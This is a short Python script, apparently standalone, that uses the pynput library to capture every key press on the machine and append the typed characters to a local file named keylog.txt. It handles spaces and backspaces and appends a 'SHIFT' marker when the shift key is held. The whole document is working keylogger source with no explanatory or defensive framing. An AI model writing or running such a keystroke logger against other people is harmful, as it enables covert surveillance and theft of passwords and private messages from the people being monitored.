from pynput.keyboard import Key, Listener, Controller

c = Controller()


def on_press(key):
    final = str(key)
    if final.startswith("'"):
        final = final.replace("'","")
    else:
        final = final.replace('"','')
    if final == "Key.space":
        final = " "
    if final == "Key.backspace":
        with open("keylog.txt","r") as f:
            temp = f.read()
        with open("keylog.txt","w") as f:
            f.write(temp[0:-1])
    else:
        if final.startswith("Key."):
            final = ""
        with open("keylog.txt","a") as f:
            if final != "":
                f.write(final)
                if c.shift_pressed:
                    f.write("SHIFT")

with Listener(on_press=on_press) as listener :
    listener.join()